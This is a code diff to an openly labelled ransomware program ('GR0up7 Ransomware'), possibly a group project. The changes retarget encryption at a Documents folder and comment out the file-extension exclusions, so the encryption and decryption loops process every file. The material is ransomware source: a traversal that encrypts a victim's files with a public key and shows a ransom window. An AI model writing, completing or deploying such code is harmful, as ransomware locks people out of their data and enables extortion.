@@ -23,8 +23,8 @@ from PIL import ImageTk, Image
 KEEP_ACTIVE_WINDOW_TIME = 20
 
 # ENCRYPT_FOLDER_PATH = "../Documents"
-ENCRYPT_FOLDER_PATH = "../"  # CHANGE THIS
-EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe', '.so', '.GR0up7', '.jpeg']  # CHANGE THIS
+ENCRYPT_FOLDER_PATH = "../Documents"  # CHANGE THIS
+#EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe', '.so', '.GR0up7', '.jpeg']  # CHANGE THIS
 RANWOMWARE_WINDOW_NAME = 'GR0up7 Ransomware'  # CHANGE THIS
 
 ###########################################################################################################################
@@ -112,7 +112,7 @@ class GUI(Thread):
             filePath = Path(item)
             fileType = filePath.suffix.lower()
 
-            if fileType in EXCLUDED_EXTENSIONS: continue
+            #if fileType in EXCLUDED_EXTENSIONS: continue
             decrypt(str(filePath), './media/private.pem')
 
         self.root.destroy()
@@ -194,7 +194,7 @@ def encryption_traversal():
         filePath = Path(item)
         fileType = filePath.suffix.lower()
 
-        if fileType in EXCLUDED_EXTENSIONS: continue
+        #if fileType in EXCLUDED_EXTENSIONS: continue
         encrypt(filePath, pubKey)
 
 ###########################################################################################################################
